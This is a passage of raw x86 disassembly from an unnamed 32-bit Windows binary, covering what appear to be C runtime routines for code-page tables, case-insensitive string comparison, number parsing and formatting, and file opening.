  436dff:	je     0x436e23
  436e01:	sub    eax,0x4
  436e04:	je     0x436e1d
  436e06:	sub    eax,0xd
  436e09:	je     0x436e17
  436e0b:	dec    eax
  436e0c:	je     0x436e11
  436e0e:	xor    eax,eax
  436e10:	ret    
  436e11:	mov    eax,0x404
  436e16:	ret    
  436e17:	mov    eax,0x412
  436e1c:	ret    
  436e1d:	mov    eax,0x804
  436e22:	ret    
  436e23:	mov    eax,0x411
  436e28:	ret    
  436e29:	push   edi
  436e2a:	push   0x40
  436e2c:	xor    eax,eax
  436e2e:	pop    ecx
  436e2f:	mov    edi,0x464ec0
  436e34:	rep stos DWORD PTR es:[edi],eax
  436e36:	stos   BYTE PTR es:[edi],al
  436e37:	xor    eax,eax
  436e39:	mov    ds:0x464fc4,eax
  436e3e:	mov    ds:0x464eb8,eax
  436e43:	mov    ds:0x464eb0,eax
  436e48:	mov    edi,0x464fd0
  436e4d:	stos   DWORD PTR es:[edi],eax
  436e4e:	stos   DWORD PTR es:[edi],eax
  436e4f:	stos   DWORD PTR es:[edi],eax
  436e50:	pop    edi
  436e51:	ret    
  436e52:	push   ebp
  436e53:	mov    ebp,esp
  436e55:	sub    esp,0x518
  436e5b:	mov    eax,ds:0x43d404
  436e60:	mov    DWORD PTR [ebp-0x4],eax
  436e63:	push   esi
  436e64:	lea    eax,[ebp-0x18]
  436e67:	push   eax
  436e68:	push   DWORD PTR ds:0x464fc4
  436e6e:	call   DWORD PTR ds:0x4390b4
  436e74:	cmp    eax,0x1
  436e77:	mov    esi,0x100
  436e7c:	jne    0x436f8f
  436e82:	xor    eax,eax
  436e84:	mov    BYTE PTR [ebp+eax*1-0x118],al
  436e8b:	inc    eax
  436e8c:	cmp    eax,esi
  436e8e:	jb     0x436e84
  436e90:	mov    al,BYTE PTR [ebp-0x12]
  436e93:	test   al,al
  436e95:	mov    BYTE PTR [ebp-0x118],0x20
  436e9c:	je     0x436ed4
  436e9e:	push   ebx
  436e9f:	lea    edx,[ebp-0x11]
  436ea2:	push   edi
  436ea3:	movzx  ecx,BYTE PTR [edx]
  436ea6:	movzx  eax,al
  436ea9:	cmp    eax,ecx
  436eab:	ja     0x436eca
  436ead:	sub    ecx,eax
  436eaf:	inc    ecx
  436eb0:	mov    ebx,ecx
  436eb2:	shr    ecx,0x2
  436eb5:	lea    edi,[ebp+eax*1-0x118]
  436ebc:	mov    eax,0x20202020
  436ec1:	rep stos DWORD PTR es:[edi],eax
  436ec3:	mov    ecx,ebx
  436ec5:	and    ecx,0x3
  436ec8:	rep stos BYTE PTR es:[edi],al
  436eca:	inc    edx
  436ecb:	mov    al,BYTE PTR [edx]
  436ecd:	inc    edx
  436ece:	test   al,al
  436ed0:	jne    0x436ea3
  436ed2:	pop    edi
  436ed3:	pop    ebx
  436ed4:	push   0x0
  436ed6:	push   DWORD PTR ds:0x464eb0
  436edc:	lea    eax,[ebp-0x518]
  436ee2:	push   DWORD PTR ds:0x464fc4
  436ee8:	push   eax
  436ee9:	push   esi
  436eea:	lea    eax,[ebp-0x118]
  436ef0:	push   eax
  436ef1:	push   0x1
  436ef3:	call   0x435738
  436ef8:	push   0x0
  436efa:	push   DWORD PTR ds:0x464fc4
  436f00:	lea    eax,[ebp-0x218]
  436f06:	push   esi
  436f07:	push   eax
  436f08:	push   esi
  436f09:	lea    eax,[ebp-0x118]
  436f0f:	push   eax
  436f10:	push   esi
  436f11:	push   DWORD PTR ds:0x464eb0
  436f17:	call   0x430947
  436f1c:	push   0x0
  436f1e:	push   DWORD PTR ds:0x464fc4
  436f24:	lea    eax,[ebp-0x318]
  436f2a:	push   esi
  436f2b:	push   eax
  436f2c:	push   esi
  436f2d:	lea    eax,[ebp-0x118]
  436f33:	push   eax
  436f34:	push   0x200
  436f39:	push   DWORD PTR ds:0x464eb0
  436f3f:	call   0x430947
  436f44:	add    esp,0x5c
  436f47:	xor    eax,eax
  436f49:	mov    cx,WORD PTR [ebp+eax*2-0x518]
  436f51:	test   cl,0x1
  436f54:	je     0x436f6c
  436f56:	or     BYTE PTR [eax+0x464ec1],0x10
  436f5d:	mov    cl,BYTE PTR [ebp+eax*1-0x218]
  436f64:	mov    BYTE PTR [eax+0x464fe0],cl
  436f6a:	jmp    0x436f88
  436f6c:	test   cl,0x2
  436f6f:	je     0x436f81
  436f71:	or     BYTE PTR [eax+0x464ec1],0x20
  436f78:	mov    cl,BYTE PTR [ebp+eax*1-0x318]
  436f7f:	jmp    0x436f64
  436f81:	mov    BYTE PTR [eax+0x464fe0],0x0
  436f88:	inc    eax
  436f89:	cmp    eax,esi
  436f8b:	jb     0x436f49
  436f8d:	jmp    0x436fd3
  436f8f:	xor    eax,eax
  436f91:	cmp    eax,0x41
  436f94:	jb     0x436faf
  436f96:	cmp    eax,0x5a
  436f99:	ja     0x436faf
  436f9b:	or     BYTE PTR [eax+0x464ec1],0x10
  436fa2:	mov    cl,al
  436fa4:	add    cl,0x20
  436fa7:	mov    BYTE PTR [eax+0x464fe0],cl
  436fad:	jmp    0x436fce
  436faf:	cmp    eax,0x61
  436fb2:	jb     0x436fc7
  436fb4:	cmp    eax,0x7a
  436fb7:	ja     0x436fc7
  436fb9:	or     BYTE PTR [eax+0x464ec1],0x20
  436fc0:	mov    cl,al
  436fc2:	sub    cl,0x20
  436fc5:	jmp    0x436fa7
  436fc7:	mov    BYTE PTR [eax+0x464fe0],0x0
  436fce:	inc    eax
  436fcf:	cmp    eax,esi
  436fd1:	jb     0x436f91
  436fd3:	mov    ecx,DWORD PTR [ebp-0x4]
  436fd6:	pop    esi
  436fd7:	call   0x42f1f2
  436fdc:	leave  
  436fdd:	ret    
  436fde:	push   ebp
  436fdf:	mov    ebp,esp
  436fe1:	sub    esp,0x1c
  436fe4:	mov    eax,ds:0x43d404
  436fe9:	push   ebx
  436fea:	push   esi
  436feb:	mov    esi,DWORD PTR [ebp+0x8]
  436fee:	xor    ebx,ebx
  436ff0:	cmp    esi,ebx
  436ff2:	mov    DWORD PTR [ebp-0x4],eax
  436ff5:	push   edi
  436ff6:	je     0x437150
  436ffc:	xor    edx,edx
  436ffe:	xor    eax,eax
  437000:	cmp    DWORD PTR [eax+0x43dda8],esi
  437006:	je     0x43706d
  437008:	add    eax,0x30
  43700b:	inc    edx
  43700c:	cmp    eax,0xf0
  437011:	jb     0x437000
  437013:	lea    eax,[ebp-0x18]
  437016:	push   eax
  437017:	push   esi
  437018:	call   DWORD PTR ds:0x4390b4
  43701e:	cmp    eax,0x1
  437021:	jne    0x437148
  437027:	push   0x40
  437029:	xor    eax,eax
  43702b:	cmp    DWORD PTR [ebp-0x18],0x1
  43702f:	pop    ecx
  437030:	mov    edi,0x464ec0
  437035:	rep stos DWORD PTR es:[edi],eax
  437037:	stos   BYTE PTR es:[edi],al
  437038:	mov    DWORD PTR ds:0x464fc4,esi
  43703e:	mov    DWORD PTR ds:0x464eb0,ebx
  437044:	jbe    0x437136
  43704a:	cmp    BYTE PTR [ebp-0x12],0x0
  43704e:	je     0x43710e
  437054:	lea    ecx,[ebp-0x11]
  437057:	mov    dl,BYTE PTR [ecx]
  437059:	test   dl,dl
  43705b:	je     0x43710e
  437061:	movzx  eax,BYTE PTR [ecx-0x1]
  437065:	movzx  edx,dl
  437068:	jmp    0x4370fe
  43706d:	push   0x40
  43706f:	xor    eax,eax
  437071:	pop    ecx
  437072:	mov    edi,0x464ec0
  437077:	rep stos DWORD PTR es:[edi],eax
  437079:	lea    ecx,[edx+edx*2]
  43707c:	shl    ecx,0x4
  43707f:	mov    DWORD PTR [ebp-0x1c],ebx
  437082:	stos   BYTE PTR es:[edi],al
  437083:	lea    ebx,[ecx+0x43ddb8]
  437089:	mov    al,BYTE PTR [ebx]
  43708b:	mov    esi,ebx
  43708d:	jmp    0x4370b8
  43708f:	mov    dl,BYTE PTR [esi+0x1]
  437092:	test   dl,dl
  437094:	je     0x4370bc
  437096:	movzx  eax,al
  437099:	movzx  edi,dl
  43709c:	cmp    eax,edi
  43709e:	ja     0x4370b4
  4370a0:	mov    edx,DWORD PTR [ebp-0x1c]
  4370a3:	mov    dl,BYTE PTR [edx+0x43dda0]
  4370a9:	or     BYTE PTR [eax+0x464ec1],dl
  4370af:	inc    eax
  4370b0:	cmp    eax,edi
  4370b2:	jbe    0x4370a9
  4370b4:	inc    esi
  4370b5:	inc    esi
  4370b6:	mov    al,BYTE PTR [esi]
  4370b8:	test   al,al
  4370ba:	jne    0x43708f
  4370bc:	inc    DWORD PTR [ebp-0x1c]
  4370bf:	add    ebx,0x8
  4370c2:	cmp    DWORD PTR [ebp-0x1c],0x4
  4370c6:	jb     0x437089
  4370c8:	mov    eax,DWORD PTR [ebp+0x8]
  4370cb:	mov    ds:0x464fc4,eax
  4370d0:	mov    DWORD PTR ds:0x464eb8,0x1
  4370da:	call   0x436dfa
  4370df:	lea    ecx,[ecx+0x43ddac]
  4370e5:	mov    esi,ecx
  4370e7:	mov    edi,0x464fd0
  4370ec:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4370ed:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4370ee:	mov    ds:0x464eb0,eax
  4370f3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4370f4:	jmp    0x437155
  4370f6:	or     BYTE PTR [eax+0x464ec1],0x4
  4370fd:	inc    eax
  4370fe:	cmp    eax,edx
  437100:	jbe    0x4370f6
  437102:	inc    ecx
  437103:	inc    ecx
  437104:	cmp    BYTE PTR [ecx-0x1],0x0
  437108:	jne    0x437057
  43710e:	xor    ecx,ecx
  437110:	inc    ecx
  437111:	mov    eax,ecx
  437113:	or     BYTE PTR [eax+0x464ec1],0x8
  43711a:	inc    eax
  43711b:	cmp    eax,0xff
  437120:	jb     0x437113
  437122:	mov    eax,esi
  437124:	call   0x436dfa
  437129:	mov    ds:0x464eb0,eax
  43712e:	mov    DWORD PTR ds:0x464eb8,ecx
  437134:	jmp    0x43713c
  437136:	mov    DWORD PTR ds:0x464eb8,ebx
  43713c:	xor    eax,eax
  43713e:	mov    edi,0x464fd0
  437143:	stos   DWORD PTR es:[edi],eax
  437144:	stos   DWORD PTR es:[edi],eax
  437145:	stos   DWORD PTR es:[edi],eax
  437146:	jmp    0x437155
  437148:	cmp    DWORD PTR ds:0x43ff1c,ebx
  43714e:	je     0x43715e
  437150:	call   0x436e29
  437155:	call   0x436e52
  43715a:	xor    eax,eax
  43715c:	jmp    0x437161
  43715e:	or     eax,0xffffffff
  437161:	mov    ecx,DWORD PTR [ebp-0x4]
  437164:	pop    edi
  437165:	pop    esi
  437166:	pop    ebx
  437167:	call   0x42f1f2
  43716c:	leave  
  43716d:	ret    
  43716e:	push   0x14
  437170:	push   0x43b440
  437175:	call   0x431210
  43717a:	or     DWORD PTR [ebp-0x20],0xffffffff
  43717e:	push   0xd
  437180:	call   0x431126
  437185:	pop    ecx
  437186:	xor    edi,edi
  437188:	mov    DWORD PTR [ebp-0x4],edi
  43718b:	mov    DWORD PTR ds:0x43ff1c,edi
  437191:	mov    eax,DWORD PTR [ebp+0x8]
  437194:	cmp    eax,0xfffffffe
  437197:	jne    0x4371ab
  437199:	mov    DWORD PTR ds:0x43ff1c,0x1
  4371a3:	call   DWORD PTR ds:0x439158
  4371a9:	jmp    0x4371d6
  4371ab:	cmp    eax,0xfffffffd
  4371ae:	jne    0x4371c2
  4371b0:	mov    DWORD PTR ds:0x43ff1c,0x1
  4371ba:	call   DWORD PTR ds:0x439154
  4371c0:	jmp    0x4371d6
  4371c2:	cmp    eax,0xfffffffc
  4371c5:	jne    0x4371d6
  4371c7:	mov    DWORD PTR ds:0x43ff1c,0x1
  4371d1:	mov    eax,ds:0x43fe64
  4371d6:	mov    DWORD PTR [ebp+0x8],eax
  4371d9:	cmp    eax,DWORD PTR ds:0x464fc4
  4371df:	je     0x4372a0
  4371e5:	mov    esi,DWORD PTR ds:0x464eb4
  4371eb:	mov    DWORD PTR [ebp-0x24],esi
  4371ee:	cmp    esi,edi
  4371f0:	je     0x4371f6
  4371f2:	cmp    DWORD PTR [esi],edi
  4371f4:	je     0x437206
  4371f6:	push   0x220
  4371fb:	call   0x4311fe
  437200:	pop    ecx
  437201:	mov    esi,eax
  437203:	mov    DWORD PTR [ebp-0x24],esi
  437206:	cmp    esi,edi
  437208:	je     0x437289
  43720a:	push   DWORD PTR [ebp+0x8]
  43720d:	call   0x436fde
  437212:	pop    ecx
  437213:	mov    DWORD PTR [ebp-0x20],eax
  437216:	cmp    eax,edi
  437218:	jne    0x437289
  43721a:	mov    DWORD PTR [esi],edi
  43721c:	mov    eax,ds:0x464fc4
  437221:	mov    DWORD PTR [esi+0x4],eax
  437224:	mov    eax,ds:0x464eb8
  437229:	mov    DWORD PTR [esi+0x8],eax
  43722c:	mov    eax,ds:0x464eb0
  437231:	mov    DWORD PTR [esi+0xc],eax
  437234:	xor    eax,eax
  437236:	mov    DWORD PTR [ebp-0x1c],eax
  437239:	cmp    eax,0x5
  43723c:	jge    0x43724e
  43723e:	mov    cx,WORD PTR [eax*2+0x464fd0]
  437246:	mov    WORD PTR [esi+eax*2+0x10],cx
  43724b:	inc    eax
  43724c:	jmp    0x437236
  43724e:	xor    eax,eax
  437250:	mov    DWORD PTR [ebp-0x1c],eax
  437253:	cmp    eax,0x101
  437258:	jge    0x437267
  43725a:	mov    cl,BYTE PTR [eax+0x464ec0]
  437260:	mov    BYTE PTR [eax+esi*1+0x1c],cl
  437264:	inc    eax
  437265:	jmp    0x437250
  437267:	xor    eax,eax
  437269:	mov    DWORD PTR [ebp-0x1c],eax
  43726c:	cmp    eax,0x100
  437271:	jge    0x437283
  437273:	mov    cl,BYTE PTR [eax+0x464fe0]
  437279:	mov    BYTE PTR [eax+esi*1+0x11d],cl
  437280:	inc    eax
  437281:	jmp    0x437269
  437283:	mov    DWORD PTR ds:0x464eb4,esi
  437289:	cmp    DWORD PTR [ebp-0x20],0xffffffff
  43728d:	jne    0x4372a3
  43728f:	cmp    esi,DWORD PTR ds:0x464eb4
  437295:	je     0x4372a3
  437297:	push   esi
  437298:	call   0x42e0ed
  43729d:	pop    ecx
  43729e:	jmp    0x4372a3
  4372a0:	mov    DWORD PTR [ebp-0x20],edi
  4372a3:	or     DWORD PTR [ebp-0x4],0xffffffff
  4372a7:	call   0x4372b5
  4372ac:	mov    eax,DWORD PTR [ebp-0x20]
  4372af:	call   0x43124b
  4372b4:	ret    
  4372b5:	push   0xd
  4372b7:	call   0x431071
  4372bc:	pop    ecx
  4372bd:	ret    
  4372be:	cmp    DWORD PTR ds:0x46520c,0x0
  4372c5:	jne    0x4372d9
  4372c7:	push   0xfffffffd
  4372c9:	call   0x43716e
  4372ce:	pop    ecx
  4372cf:	mov    DWORD PTR ds:0x46520c,0x1
  4372d9:	xor    eax,eax
  4372db:	ret    
  4372dc:	int3   
  4372dd:	int3   
  4372de:	int3   
  4372df:	int3   
  4372e0:	push   ebp
  4372e1:	mov    ebp,esp
  4372e3:	push   edi
  4372e4:	push   esi
  4372e5:	push   ebx
  4372e6:	mov    esi,DWORD PTR [ebp+0xc]
  4372e9:	mov    edi,DWORD PTR [ebp+0x8]
  4372ec:	mov    al,0xff
  4372ee:	mov    edi,edi
  4372f0:	or     al,al
  4372f2:	je     0x437326
  4372f4:	mov    al,BYTE PTR [esi]
  4372f6:	add    esi,0x1
  4372f9:	mov    ah,BYTE PTR [edi]
  4372fb:	add    edi,0x1
  4372fe:	cmp    ah,al
  437300:	je     0x4372f0
  437302:	sub    al,0x41
  437304:	cmp    al,0x1a
  437306:	sbb    cl,cl
  437308:	and    cl,0x20
  43730b:	add    al,cl
  43730d:	add    al,0x41
  43730f:	xchg   al,ah
  437311:	sub    al,0x41
  437313:	cmp    al,0x1a
  437315:	sbb    cl,cl
  437317:	and    cl,0x20
  43731a:	add    al,cl
  43731c:	add    al,0x41
  43731e:	cmp    al,ah
  437320:	je     0x4372f0
  437322:	sbb    al,al
  437324:	sbb    al,0xff
  437326:	movsx  eax,al
  437329:	pop    ebx
  43732a:	pop    esi
  43732b:	pop    edi
  43732c:	leave  
  43732d:	ret    
  43732e:	push   ebp
  43732f:	mov    ebp,esp
  437331:	push   ecx
  437332:	push   ebx
  437333:	call   0x433901
  437338:	mov    ebx,DWORD PTR [eax+0x64]
  43733b:	cmp    ebx,DWORD PTR ds:0x43d6ec
  437341:	je     0x43734a
  437343:	call   0x42f803
  437348:	mov    ebx,eax
  43734a:	cmp    DWORD PTR [ebx+0x14],0x0
  43734e:	jne    0x43735f
  437350:	push   DWORD PTR [ebp+0xc]
  437353:	push   DWORD PTR [ebp+0x8]
  437356:	call   0x4372e0
  43735b:	pop    ecx
  43735c:	pop    ecx
  43735d:	jmp    0x437394
  43735f:	push   esi
  437360:	mov    esi,DWORD PTR [ebp+0x8]
  437363:	push   edi
  437364:	mov    edi,DWORD PTR [ebp+0xc]
  437367:	movzx  eax,BYTE PTR [esi]
  43736a:	push   eax
  43736b:	push   ebx
  43736c:	call   0x437ab2
  437371:	mov    DWORD PTR [ebp-0x4],eax
  437374:	movzx  eax,BYTE PTR [edi]
  437377:	push   eax
  437378:	push   ebx
  437379:	inc    esi
  43737a:	call   0x437ab2
  43737f:	add    esp,0x10
  437382:	mov    ecx,eax
  437384:	mov    eax,DWORD PTR [ebp-0x4]
  437387:	inc    edi
  437388:	test   eax,eax
  43738a:	je     0x437390
  43738c:	cmp    eax,ecx
  43738e:	je     0x437367
  437390:	pop    edi
  437391:	sub    eax,ecx
  437393:	pop    esi
  437394:	pop    ebx
  437395:	leave  
  437396:	ret    
  437397:	push   esi
  437398:	push   edi
  437399:	call   0x433901
  43739e:	mov    edi,DWORD PTR [eax+0x64]
  4373a1:	cmp    edi,DWORD PTR ds:0x43d6ec
  4373a7:	je     0x4373b0
  4373a9:	call   0x42f803
  4373ae:	mov    edi,eax
  4373b0:	mov    esi,DWORD PTR [esp+0xc]
  4373b4:	cmp    DWORD PTR [edi+0x28],0x1
  4373b8:	movzx  eax,BYTE PTR [esi]
  4373bb:	jle    0x4373cb
  4373bd:	push   0x8
  4373bf:	push   eax
  4373c0:	push   edi
  4373c1:	call   0x435f49
  4373c6:	add    esp,0xc
  4373c9:	jmp    0x4373d5
  4373cb:	mov    ecx,DWORD PTR [edi+0x48]
  4373ce:	movzx  eax,BYTE PTR [ecx+eax*2]
  4373d2:	and    eax,0x8
  4373d5:	test   eax,eax
  4373d7:	je     0x4373dc
  4373d9:	inc    esi
  4373da:	jmp    0x4373b4
  4373dc:	movzx  ecx,BYTE PTR [esi]
  4373df:	inc    esi
  4373e0:	cmp    ecx,0x2d
  4373e3:	mov    edx,ecx
  4373e5:	je     0x4373ec
  4373e7:	cmp    ecx,0x2b
  4373ea:	jne    0x4373f0
  4373ec:	movzx  ecx,BYTE PTR [esi]
  4373ef:	inc    esi
  4373f0:	xor    eax,eax
  4373f2:	cmp    ecx,0x30
  4373f5:	jl     0x437401
  4373f7:	cmp    ecx,0x39
  4373fa:	jg     0x437401
  4373fc:	sub    ecx,0x30
  4373ff:	jmp    0x437404
  437401:	or     ecx,0xffffffff
  437404:	cmp    ecx,0xffffffff
  437407:	je     0x437415
  437409:	lea    eax,[eax+eax*4]
  43740c:	lea    eax,[ecx+eax*2]
  43740f:	movzx  ecx,BYTE PTR [esi]
  437412:	inc    esi
  437413:	jmp    0x4373f2
  437415:	cmp    edx,0x2d
  437418:	pop    edi
  437419:	pop    esi
  43741a:	jne    0x43741e
  43741c:	neg    eax
  43741e:	ret    
  43741f:	push   ebp
  437420:	mov    ebp,esp
  437422:	push   ecx
  437423:	push   ebx
  437424:	call   0x433901
  437429:	mov    ebx,DWORD PTR [eax+0x64]
  43742c:	cmp    ebx,DWORD PTR ds:0x43d6ec
  437432:	je     0x43743b
  437434:	call   0x42f803
  437439:	mov    ebx,eax
  43743b:	cmp    DWORD PTR [ebp+0x10],0x0
  43743f:	je     0x437499
  437441:	cmp    DWORD PTR [ebx+0x14],0x0
  437445:	jne    0x43745a
  437447:	push   DWORD PTR [ebp+0x10]
  43744a:	push   DWORD PTR [ebp+0xc]
  43744d:	push   DWORD PTR [ebp+0x8]
  437450:	call   0x437bc0
  437455:	add    esp,0xc
  437458:	jmp    0x43749b
  43745a:	push   esi
  43745b:	mov    esi,DWORD PTR [ebp+0x8]
  43745e:	push   edi
  43745f:	mov    edi,DWORD PTR [ebp+0xc]
  437462:	movzx  eax,BYTE PTR [esi]
  437465:	push   eax
  437466:	push   ebx
  437467:	call   0x437ab2
  43746c:	mov    DWORD PTR [ebp-0x4],eax
  43746f:	movzx  eax,BYTE PTR [edi]
  437472:	push   eax
  437473:	push   ebx
  437474:	inc    esi
  437475:	call   0x437ab2
  43747a:	add    esp,0x10
  43747d:	inc    edi
  43747e:	dec    DWORD PTR [ebp+0x10]
  437481:	mov    ecx,eax
  437483:	je     0x437490
  437485:	cmp    DWORD PTR [ebp-0x4],0x0
  437489:	je     0x437490
  43748b:	cmp    DWORD PTR [ebp-0x4],ecx
  43748e:	je     0x437462
  437490:	mov    eax,DWORD PTR [ebp-0x4]
  437493:	pop    edi
  437494:	sub    eax,ecx
  437496:	pop    esi
  437497:	jmp    0x43749b
  437499:	xor    eax,eax
  43749b:	pop    ebx
  43749c:	leave  
  43749d:	ret    
  43749e:	cmp    DWORD PTR [esp+0x8],0x0
  4374a3:	je     0x4374ab
  4374a5:	mov    BYTE PTR [ecx],0x2d
  4374a8:	inc    ecx
  4374a9:	neg    eax
  4374ab:	push   esi
  4374ac:	mov    esi,ecx
  4374ae:	xor    edx,edx
  4374b0:	div    DWORD PTR [esp+0x8]
  4374b4:	cmp    edx,0x9
  4374b7:	jbe    0x4374be
  4374b9:	add    dl,0x57
  4374bc:	jmp    0x4374c1
  4374be:	add    dl,0x30
  4374c1:	mov    BYTE PTR [ecx],dl
  4374c3:	inc    ecx
  4374c4:	test   eax,eax
  4374c6:	ja     0x4374ae
  4374c8:	mov    BYTE PTR [ecx],0x0
  4374cb:	dec    ecx
  4374cc:	mov    dl,BYTE PTR [esi]
  4374ce:	mov    al,BYTE PTR [ecx]
  4374d0:	mov    BYTE PTR [ecx],dl
  4374d2:	dec    ecx
  4374d3:	mov    BYTE PTR [esi],al
  4374d5:	inc    esi
  4374d6:	cmp    esi,ecx
  4374d8:	jb     0x4374cc
  4374da:	pop    esi
  4374db:	ret    
  4374dc:	push   ebp
  4374dd:	mov    ebp,esp
  4374df:	cmp    DWORD PTR [ebp+0x10],0xa
  4374e3:	mov    eax,DWORD PTR [ebp+0x8]
  4374e6:	jne    0x4374f2
  4374e8:	test   eax,eax
  4374ea:	jge    0x4374f2
  4374ec:	push   0x1
  4374ee:	push   0xa
  4374f0:	jmp    0x4374f7
  4374f2:	push   0x0
  4374f4:	push   DWORD PTR [ebp+0x10]
  4374f7:	mov    ecx,DWORD PTR [ebp+0xc]
  4374fa:	call   0x43749e
  4374ff:	mov    eax,DWORD PTR [ebp+0xc]
  437502:	pop    ecx
  437503:	pop    ecx
  437504:	pop    ebp
  437505:	ret    
  437506:	push   ebp
  437507:	mov    ebp,esp
  437509:	sub    esp,0x1c
  43750c:	mov    edx,DWORD PTR [ebp+0x14]
  43750f:	push   ebx
  437510:	push   esi
  437511:	xor    esi,esi
  437513:	test   dl,dl
  437515:	mov    DWORD PTR [ebp-0x1c],0xc
  43751c:	mov    DWORD PTR [ebp-0x18],esi
  43751f:	jns    0x43752a
  437521:	mov    DWORD PTR [ebp-0x14],esi
  437524:	mov    BYTE PTR [ebp-0x1],0x10
  437528:	jmp    0x437535
  43752a:	mov    DWORD PTR [ebp-0x14],0x1
  437531:	mov    BYTE PTR [ebp-0x1],0x0
  437535:	mov    eax,0x8000
  43753a:	test   eax,edx
  43753c:	jne    0x43754f
  43753e:	test   dh,0x40
  437541:	jne    0x43754b
  437543:	cmp    DWORD PTR ds:0x43ffe4,eax
  437549:	je     0x43754f
  43754b:	or     BYTE PTR [ebp-0x1],0x80
  43754f:	push   0x3
  437551:	mov    eax,edx
  437553:	pop    ebx
  437554:	and    eax,ebx
  437556:	sub    eax,esi
  437558:	je     0x437572
  43755a:	dec    eax
  43755b:	je     0x437569
  43755d:	dec    eax
  43755e:	jne    0x43758d
  437560:	mov    DWORD PTR [ebp-0x10],0xc0000000
  437567:	jmp    0x437579
  437569:	mov    DWORD PTR [ebp-0x10],0x40000000
  437570:	jmp    0x437579
  437572:	mov    DWORD PTR [ebp-0x10],0x80000000
  437579:	cmp    ecx,0x10
  43757c:	je     0x4375be
  43757e:	cmp    ecx,0x20
  437581:	je     0x4375b5
  437583:	cmp    ecx,0x30
  437586:	je     0x4375ac
  437588:	cmp    ecx,0x40
  43758b:	je     0x4375a7
  43758d:	call   0x432878
  437592:	mov    DWORD PTR [eax],0x16
  437598:	call   0x432881
  43759d:	mov    DWORD PTR [eax],esi
  43759f:	or     eax,0xffffffff
  4375a2:	jmp    0x43779e
  4375a7:	mov    DWORD PTR [ebp-0x8],ebx
  4375aa:	jmp    0x4375c1
  4375ac:	mov    DWORD PTR [ebp-0x8],0x2
  4375b3:	jmp    0x4375c1
  4375b5:	mov    DWORD PTR [ebp-0x8],0x1
  4375bc:	jmp    0x4375c1
  4375be:	mov    DWORD PTR [ebp-0x8],esi
  4375c1:	mov    eax,edx
  4375c3:	mov    edx,0x700
  4375c8:	and    eax,edx
  4375ca:	mov    ecx,0x400
  4375cf:	cmp    eax,ecx
  4375d1:	push   edi
  4375d2:	mov    edi,0x100
  4375d7:	jg     0x437608
  4375d9:	je     0x437603
  4375db:	cmp    eax,esi
  4375dd:	je     0x437603
  4375df:	cmp    eax,edi
  4375e1:	je     0x4375fa
  4375e3:	cmp    eax,0x200
  4375e8:	je     0x437634
  4375ea:	cmp    eax,0x300
  4375ef:	jne    0x43761a
  4375f1:	mov    DWORD PTR [ebp-0xc],0x2
  4375f8:	jmp    0x437644
  4375fa:	mov    DWORD PTR [ebp-0xc],0x4
  437601:	jmp    0x437644
  437603:	mov    DWORD PTR [ebp-0xc],ebx
  437606:	jmp    0x437644
  437608:	cmp    eax,0x500
  43760d:	je     0x43763d
  43760f:	cmp    eax,0x600
  437614:	je     0x437634
  437616:	cmp    eax,edx
  437618:	je     0x43763d
  43761a:	call   0x432878
  43761f:	mov    DWORD PTR [eax],0x16
  437625:	call   0x432881
  43762a:	mov    DWORD PTR [eax],esi
  43762c:	or     eax,0xffffffff
  43762f:	jmp    0x43779d
  437634:	mov    DWORD PTR [ebp-0xc],0x5
  43763b:	jmp    0x437644
  43763d:	mov    DWORD PTR [ebp-0xc],0x1
  437644:	mov    eax,DWORD PTR [ebp+0x14]
  437647:	test   edi,eax
  437649:	mov    esi,0x80
  43764e:	je     0x437662
  437650:	mov    ecx,DWORD PTR ds:0x43fcac
  437656:	not    ecx
  437658:	and    ecx,DWORD PTR [ebp+0x18]
  43765b:	test   cl,cl
  43765d:	js     0x437662
  43765f:	xor    esi,esi
  437661:	inc    esi
  437662:	test   al,0x40
  437664:	je     0x43767d
  437666:	or     BYTE PTR [ebp-0xe],0x1
  43766a:	or     esi,0x4000000
  437670:	cmp    DWORD PTR ds:0x43fcb0,0x2
  437677:	jne    0x43767d
  437679:	or     DWORD PTR [ebp-0x8],0x4
  43767d:	test   ah,0x10
  437680:	je     0x437684
  437682:	or     esi,edi
  437684:	test   al,0x20
  437686:	je     0x437690
  437688:	or     esi,0x8000000
  43768e:	jmp    0x43769a
  437690:	test   al,0x10
  437692:	je     0x43769a
  437694:	or     esi,0x10000000
  43769a:	call   0x4368bb
  43769f:	mov    edi,eax
  4376a1:	or     ebx,0xffffffff
  4376a4:	cmp    edi,ebx
  4376a6:	jne    0x4376c2
  4376a8:	call   0x432878
  4376ad:	mov    DWORD PTR [eax],0x18
  4376b3:	call   0x432881
  4376b8:	and    DWORD PTR [eax],0x0
  4376bb:	mov    eax,ebx
  4376bd:	jmp    0x43779d
  4376c2:	mov    eax,DWORD PTR [ebp+0x8]
  4376c5:	push   0x0
  4376c7:	push   esi
  4376c8:	push   DWORD PTR [ebp-0xc]
  4376cb:	mov    DWORD PTR [eax],0x1
  4376d1:	mov    eax,DWORD PTR [ebp+0xc]
  4376d4:	mov    DWORD PTR [eax],edi
  4376d6:	lea    eax,[ebp-0x1c]
  4376d9:	push   eax
  4376da:	push   DWORD PTR [ebp-0x8]
  4376dd:	push   DWORD PTR [ebp-0x10]
  4376e0:	push   DWORD PTR [ebp+0x10]
  4376e3:	call   DWORD PTR ds:0x439008
  4376e9:	mov    esi,eax
  4376eb:	cmp    esi,ebx
  4376ed:	je     0x437701
  4376ef:	push   esi
  4376f0:	call   DWORD PTR ds:0x4390f4
  4376f6:	test   eax,eax
  4376f8:	jne    0x437710
  4376fa:	push   esi
  4376fb:	call   DWORD PTR ds:0x439068
  437701:	call   DWORD PTR ds:0x4390ac
  437707:	push   eax
  437708:	call   0x43288a
  43770d:	pop    ecx
  43770e:	jmp    0x4376bb
  437710:	cmp    eax,0x2
  437713:	jne    0x43771b
  437715:	or     BYTE PTR [ebp-0x1],0x40
  437719:	jmp    0x437724
  43771b:	cmp    eax,0x3
  43771e:	jne    0x437724
  437720:	or     BYTE PTR [ebp-0x1],0x8
  437724:	push   esi
  437725:	push   edi
  437726:	call   0x4366bd
  43772b:	or     BYTE PTR [ebp-0x1],0x1
  43772f:	mov    eax,edi
  437731:	sar    eax,0x5
  437734:	lea    ebx,[eax*4+0x465100]
  43773b:	mov    eax,edi
  43773d:	and    eax,0x1f
  437740:	lea    esi,[eax+eax*8]
  437743:	mov    al,BYTE PTR [ebp-0x1]
  437746:	pop    ecx
  437747:	pop    ecx
  437748:	mov    ecx,DWORD PTR [ebx]
  43774a:	shl    esi,0x2
